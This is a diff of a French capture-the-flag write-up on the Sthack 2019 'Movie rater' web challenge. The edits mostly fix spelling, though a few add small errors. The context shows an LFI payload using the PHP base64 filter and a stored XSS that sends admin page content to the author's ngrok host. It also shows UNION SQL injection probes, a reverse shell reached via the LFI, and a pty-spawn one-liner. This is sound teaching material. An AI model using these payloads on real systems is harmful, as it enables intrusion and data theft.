@@ -48,9 +48,9 @@
 <p>On peut remercier <a href="https://twitter.com/sth4ck" title="Twitter de la sthack">@sth4ck</a> pour cette magnifique photo du classement 2019. ;)</p>
 
 <h1 id="etape-1--tour-dhorizon-du-challenger">Etape 1 : Tour d’horizon du challenger</h1>
-<p>Movie rater est un site où l’administrateur donne sa note sur les films de “hacker” préférés. Ce site est composé de trois pages accessibles pour le visiteur. Nous verrons par la suite qu’il existe d’autres pages utilisés par l’administrateur. Voici les trois pages:</p>
+<p>Movie rater est un site où l’administrateur donne sa note sur les films de “hacker” préférés. Ce site est composé de trois pages accessibles pour le visiteur. Nous verrons par la suite qu’il existe d’autres pages utilisées par l’administrateur. Voici les trois pages:</p>
 <ul>
-  <li>Home : La page home qui n’a pas beaucoup d’interêt</li>
+  <li>Home : La page home qui n’a pas beaucoup d’intérêt</li>
   <li>Movies : Cette page affiche toutes les affiches des films et leurs notes.
 <img src="/assets/images/sthack_2019/movie_rater_page_movies.png" alt="Page movies" /></li>
   <li>Rate : Cette page montre la photo de l’affiche et sa note ainsi que champs textbox pour donner son avis sur la note du film si le visiteur n’est pas d’accord avec la note donnée.
@@ -62,11 +62,11 @@
 
 <p><img src="/assets/images/sthack_2019/faille_lfi.png" alt="Page rate" /></p>
 
-<p>Pour rappel une LFI permet notamment de lire le code php de la page à grace aux fonctions de filtrage de PHP. Pour récupérer le code des pages du site, nous allons utiliser le filtre base 64 de PHP comme ceci:</p>
+<p>Pour rappel une LFI permet notamment de lire le code php de la page à grâce aux fonctions de filtrage de PHP. Pour récupérer le code des pages du site, nous allons utiliser le filtre base 64 de PHP comme ceci:</p>
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">movies</span></code></pre></figure>
 
-<p>Toutefois pour que cela fonctionne, il faut faire un urlencode de ce payload.</p>
+<p>Toutefois, pour que cela fonctionne, il faut faire un urlencode de ce payload.</p>
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="o">%</span><span class="mi">2</span><span class="nx">Ffilter</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fconvert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fresource</span><span class="o">%</span><span class="mi">3</span><span class="nx">Dmovies</span></code></pre></figure>
 
@@ -77,7 +77,7 @@
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])){</span><span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="o">.</span><span class="s1">'.php'</span><span class="p">);}</span><span class="k">else</span><span class="p">{</span><span class="cp">?&gt;</span></code></pre></figure>
 
 <h2 id="headphp">head.php</h2>
-<p>Petit détail amusant, un blocage de SQLmap apparaît dans le fichier head.php. Bah oui, on est à la Sthack, tu vas quand même pas t’amuser à utiliser un outil qui te permet de te l’a coulé douce la main dans le slip pendant le CTF !.</p>
+<p>Petit détail amusant, un blocage de SQLmap apparaît dans le fichier head.php. Bah oui, on est à la Sthack, tu vas quand même pas t’amuser à utiliser un outil qui te permet de te l’a couler douce la main dans le slip pendant le CTF !.</p>
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 	<span class="nv">$user_agent</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">];</span> 
@@ -91,7 +91,7 @@
 <h2 id="ratephp">rate.php</h2>
 <p>Ce fichier rate.php correspond à la page d’affichage et commentaire de la note du film. Dans celle-ci, nous pouvons voir plusieurs choses intéressantes.</p>
 
-<p>Premièrement, il y a un contrôle des entrées utilisateur au niveau du paramètre “id” de l’URL. Seul des chiffres peuvent être entré dans ce paramètre. Donc pas une voie utilisable pour la réussite de ce challenge.</p>
+<p>Premièrement, il y a un contrôle des entrées utilisateur au niveau du paramètre “id” de l’URL. Seul des chiffres peuvent être entrés dans ce paramètre. Donc ce n’est pas une voie utilisable pour la réussite de ce challenge.</p>
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^[0-9]</span><span class="si">{</span><span class="nv">1,2</span><span class="si">}</span><span class="s2">$/"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span>
@@ -111,7 +111,7 @@
 <h2 id="change-ratephp">change-rate.php</h2>
 <p>Récupérons donc le code de cette page à l’aide de la faille LFI !</p>
 
-<p>Dans le code cette page, nous voyons que le commentaire est stocké dans une table qui semble temporaire et qui va permettre à l’administrateur de site de lire ce commentaire.</p>
+<p>Dans le code cette page, nous voyons que le commentaire est stocké dans une table qui semble temporaire et qui va permettre à l’administrateur du site de lire ce commentaire.</p>
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 	<span class="nv">$req</span> <span class="o">=</span> <span class="nv">$bdd</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO comments_to_be_reviewed (movie_id,comment) VALUES (:id,:comment)"</span><span class="p">);</span>
@@ -132,11 +132,11 @@
 
 <p>Ce payload va simplement rediriger l’administrateur vers une autre adresse. Ici j’utilise le logiciel ngrok qui permet de créer un tunnel de son localhost vers internet, c’est très pratique lorsque l’on veut partager un site en cours de développement en local via internet.</p>
 
-<p>Ici l’utilisation de ngrok va permettre de voir les requêtes effectuées sur notre adresse à grace au panneau de suivi d’activité du logiciel.</p>
+<p>Ici l’utilisation de ngrok va permettre de voir les requêtes effectuées sur notre adresse à grâce au panneau de suivi d’activité du logiciel.</p>
 
 <p><img src="/assets/images/sthack_2019/ngrock-test-lfi.png" alt="viewing_panel" /></p>
 
-<p>Nous pouvoir voir que deux requêtes sont arrivées, cela signifie qu’il y a bien une faille XSS lorsque l’administrateur lit les commentaires.</p>
+<p>Nous pouvons voir que deux requêtes sont arrivées, cela signifie qu’il y a bien une faille XSS lorsque l’administrateur lit les commentaires.</p>
 
 <p>Exploitons cette faille pour connaître le code de la partie accessible par l’admin. Pour cela, on va récupérer le nom du fichier php utilisé pour lire les commentaires. Comme ceux-ci:</p>
 
@@ -179,7 +179,7 @@
 
 <p><img src="/assets/images/sthack_2019/cannot-access-stats.png" alt="cannont_access_stats" /></p>
 
-<p>Pour ce faire, il faut passer par la faille XSS pour forcer l’administrateur à effectuer l’attaque. Ce qui fait que l’exploit va se dérouler en 3 étapes :</p>
+<p>Pour ce faire, il faut passer par la faille XSS pour forcer l’administrateur à effectuer l’attaque. Ce qui fait que l’exploit va se dérouler en trois étapes :</p>
 <ul>
   <li>Envoi de l’exploit via le commentaire et lecture du commentaire par l’administrateur</li>
   <li>A la lecture du commentaire, récupération en GET de la page stats.php avec en paramètre de la page, l’exploit SQLi</li>
@@ -201,9 +201,9 @@
 	  	<span class="p">});</span>	
 	<span class="o">&lt;</span><span class="sr">/script&gt;</span></code></pre></figure>
 
-<p>La première ligne permet d’inclure JQuery dans la page afin de simplifier l’envoi des requêtes GET et POST. Ensuite la requête GET déclarée avec le $.get qui va retourner dans son callback le code html de la page stats.php.</p>
+<p>La première ligne permet d’inclure JQuery dans la page afin de simplifier l’envoi des requêtes GET et POST. Ensuite, la requête GET déclarée avec le $.get qui va retourner dans son callback le code html de la page stats.php.</p>
 
-<p>Dans ce même callback, on déclare la requête post ($.post) qui va nous renvoyer ce code html. Avant le renvoi vers ngrok, le code html est décodé (decodeURIComponent) pour ne pas a avoir à le décoder à chaque lecture de la requête.</p>
+<p>Dans ce même callback, on déclare la requête post ($.post) qui va nous renvoyer ce code html. Avant le renvoi vers ngrok, le code html est décodé (decodeURIComponent) pour ne pas à avoir à le décoder à chaque lecture de la requête.</p>
 
 <p>Maintenant que nous avons mis en place notre structure pour exploiter la faille SQLi, il faut chercher à comment exploiter cette faille. Le site n’ayant pas d’interface de login connu, inutile de chercher le mot de passe de l’administrateur dans la base de données. On va donc upload un reverse shell sur le serveur, ce qui est plus utile et plus fun que de récupérer un mot de passe.</p>
 
@@ -214,7 +214,7 @@
 
 <figure class="highlight"><pre><code class="language-js" data-lang="js">		<span class="dl">"</span><span class="s2">/the-admin-secure-interface/stats.php?stats_id=' union select '666</span><span class="dl">"</span></code></pre></figure>
 
-<p>Il y a une erreur php, ce qui signifie que ce n’est pas une colonne. Essai pour deux colonnes :</p>
+<p>Il y a une erreur php, ce qui signifie que ce n’est pas une colonne. Tentative pour deux colonnes :</p>
 
 <figure class="highlight"><pre><code class="language-js" data-lang="js">		<span class="dl">"</span><span class="s2">/the-admin-secure-interface/stats.php?stats_id=' union select '666', '667</span><span class="dl">"</span></code></pre></figure>
 
@@ -232,15 +232,15 @@
 
 <figure class="highlight"><pre><code class="language-js" data-lang="js">		<span class="dl">"</span><span class="s2">?page=../../../tmp/rs</span><span class="dl">"</span></code></pre></figure>
 
-<p>Une fois la connexion établie, et après une recherche dans les dossiers du serveur, on tombe sur /home/acid_burn qui possède une binaire nommé getFlag.</p>
+<p>Une fois la connexion établie et après une recherche dans les dossiers du serveur, on tombe sur /home/acid_burn qui possède un binaire nommé getFlag.</p>
 
-<p>On execute le binaire et nous demande un pseudoterminal(<a href="https://fr.wikipedia.org/wiki/Pseudo_terminal" title="Wikipédia pseudoterminal">pty</a> ) pour s’exécuter.</p>
+<p>On execute le binaire et nous demande un pseudoterminal(<a href="https://fr.wikipedia.org/wiki/Pseudo_terminal" title="Wikipédia pseudoterminal">TTY</a> ) pour s’exécuter.</p>
 
-<p>Il y a plein de façon d’obtenir un shell pty, le site  <a href="https://netsec.ws/?p=337" title="Liste des shell pty">netsec</a> à lister plusieurs façons d’obtenir un pty shell. Pour ce challenge, on utilise python en faisant :</p>
+<p>Il y a plein de façon d’obtenir un shell TTY, le site  <a href="https://netsec.ws/?p=337" title="Liste des shell pty">netsec</a> à lister plusieurs façons d’obtenir un pty shell. Pour ce challenge, on utilise python en faisant :</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">	python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span></code></pre></figure>
 
-<p>Une fois le shell pty obtenu, on peut exécuter le binaire est récupérer le flag :</p>
+<p>Une fois le shell TTY obtenu, on peut exécuter le binaire est récupéré le flag :</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text">	Sql14nDAC5RF_R3alY?!</code></pre></figure>
 
@@ -248,11 +248,6 @@
   
 </article>
 
-
-<footer class="">
-  <span></span>
-  <a class="gray" href="/welcome-to-jekyll/">Welcome to Jekyll »</a>
-</footer>
 
 
 
